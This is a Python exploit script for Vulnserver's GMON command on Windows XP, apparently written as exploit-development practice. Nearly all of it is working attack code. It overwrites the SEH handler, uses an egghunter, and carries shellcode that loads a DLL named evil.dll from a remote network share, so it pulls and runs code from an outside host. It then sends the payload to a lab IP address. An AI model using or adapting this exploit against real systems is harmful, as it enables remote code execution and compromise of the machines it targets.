# Exploit for Vulnserver - GMON - DLL Side-loading
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
import socket
import sys

egghunter = (
"\x66\x81\xca\xff"
"\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74"
"\xef\xb8\x57\x30"
"\x30\x54\x8b\xfa"
"\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")

load_library  = "\x31\xDB"                # xor ebx,ebx
load_library += "\x53"                    # push ebx
load_library += "\x68\x2E\x64\x6C\x6C"    # push 0x6c6c642e --\
load_library += "\x68\x65\x76\x69\x6C"    # push 0x6c697665   |
load_library += "\x68\x61\x72\x65\x5C"    # push 0x5c657261   |
load_library += "\x68\x38\x5C\x73\x68"    # push 0x68735c38   |-- \\192.168.136.128\share\evil.dll
load_library += "\x68\x36\x2E\x31\x32"    # push 0x32312e36   |
load_library += "\x68\x38\x2E\x31\x33"    # push 0x33312e38   |
load_library += "\x68\x32\x2E\x31\x36"    # push 0x36312e32   |
load_library += "\x68\x5C\x5C\x31\x39"    # push 0x39315c5c --/
load_library += "\x54"                    # push esp
load_library += "\xBB\x7B\x1D\x80\x7C"    # mov ebx,0x7c801d7b
load_library += "\xFF\xD3"                # call ebx

cmd    = "GMON /.:/"
tag    = "W00TW00T"
nops   = "\x90" * 20
junk1  = "A" * (3495-60-8-len(nops+load_library))
junk2  = "A" * (60-len(egghunter+nops))
nseh   = "\xEB\xC4\x90\x90"      # short jump negative 58
seh    = "\xb4\x10\x50\x62"      # 0x625010b4 pop ebx # pop ebp # ret essfunc.dll
junk3  = "D" * (5000-len(junk1+2*(nops)+egghunter+junk2+nseh+seh+load_library+tag))

buffer = cmd + tag + nops + load_library + junk1 + nops + egghunter + junk2 + nseh + seh + junk3

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.136.129", 9999))
print s.recv(1024)
s.send(buffer)
s.close()
